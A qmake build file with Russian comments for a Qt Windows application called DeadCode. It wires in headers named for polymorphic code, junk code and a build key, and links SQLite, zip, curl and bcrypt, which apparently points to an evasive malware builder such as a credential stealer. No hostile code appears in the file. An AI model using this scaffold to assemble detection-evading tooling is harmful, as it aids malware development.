# Основные модули Qt, которые используются в проекте
QT += core gui network widgets

# Имя целевого исполняемого файла
TARGET = DeadCode
# Тип проекта — приложение
TEMPLATE = app

# Исходные файлы (.cpp)
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы (.h)
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h

# Файлы интерфейса (.ui)
FORMS += \
    $$PWD/mainwindow.ui

# Ресурсы (иконка)
RC_ICONS = $$PWD/../icon.ico

# Пути для поиска заголовочных файлов
INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    C:/vcpkg/installed/x64-windows-static/include

# Библиотеки (vcpkg и системные Windows-библиотеки)
LIBS += -LC:/vcpkg/installed/x64-windows-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lbcrypt \
        -lws2_32 \
        -lshlwapi \
        -lpsapi

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -std=gnu++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS

# Флаги линковки
QMAKE_LFLAGS += -DYNAMICBASE \
                -NXCOMPAT \
                -SUBSYSTEM:WINDOWS

# Определения для сборки (добавляем дату сборки и версию из git)
# Исправляем формат даты, чтобы избежать пробелов
BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyyMMdd'")
BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul || echo unknown)
DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"

# Директории для выходных файлов
DESTDIR = $$PWD/../build
OBJECTS_DIR = $$PWD/../release
MOC_DIR = $$PWD/../release
UI_DIR = $$PWD/../release

# Очистка (удаляем только исполняемый файл, оставляем заголовки)
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe

# Дополнительные проверки и зависимости для Windows
win32 {
    CONFIG(debug, debug|release) {
        # Для отладочной сборки
        QMAKE_CXXFLAGS += -g
    } else {
        # Для релизной сборки
        QMAKE_CXXFLAGS += -O2
        QMAKE_LFLAGS += -O2
    }
}

# Пользовательские шаги сборки для генерации заголовков
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h

# Удаляем цель gen_headers, так как генерация выполняется в mainwindow.cpp
# Создание пустых файлов, если они отсутствуют
!exists($$PWD/../src/build_key.h) {
    system(powershell -Command "New-Item -Path $$PWD/../src/build_key.h -ItemType File -Force")
}
!exists($$PWD/../src/polymorphic_code.h) {
    system(powershell -Command "New-Item -Path $$PWD/../src/polymorphic_code.h -ItemType File -Force")
}
!exists($$PWD/../src/junk_code.h) {
    system(powershell -Command "New-Item -Path $$PWD/../src/junk_code.h -ItemType File -Force")
}